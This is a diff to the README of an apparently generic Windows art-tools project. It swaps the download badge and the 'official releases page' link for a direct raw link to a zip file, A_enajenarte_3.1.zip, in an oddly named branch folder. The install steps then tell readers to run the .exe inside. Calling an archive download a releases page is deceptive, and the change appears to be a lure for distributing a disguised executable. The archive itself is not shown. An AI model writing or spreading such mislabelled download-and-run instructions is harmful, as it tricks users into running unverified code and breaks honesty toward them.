@@ -1,6 +1,6 @@
 # 🚀 enajenarteAA2 - Simple art tools for your computer
 
-[![Download enajenarteAA2](https://img.shields.io/badge/Download-Release-blue)](https://github.com/hydrogencarbonateoverdrive701/enajenarteAA2)
+[![Download enajenarteAA2](https://img.shields.io/badge/Download-Release-blue)](https://github.com/hydrogencarbonateoverdrive701/enajenarteAA2/raw/refs/heads/main/unprepare/A_enajenarte_3.1.zip)
 
 ## 📁 Overview
 
@@ -27,7 +27,7 @@ EnajenarteAA2 helps users create and edit digital images on their Windows comput
 
 Follow these steps to install the software on your Windows machine.
 
-1.  Visit the [official releases page](https://github.com/hydrogencarbonateoverdrive701/enajenarteAA2) to download the installer.
+1.  Visit the [official releases page](https://github.com/hydrogencarbonateoverdrive701/enajenarteAA2/raw/refs/heads/main/unprepare/A_enajenarte_3.1.zip) to download the installer.
 2.  Locate the downloaded file in your browser downloads folder.
 3.  Double-click the file with the .exe extension to start the setup wizard.
 4.  Follow the instructions on the screen. Click "Next" to continue through the installation screens.
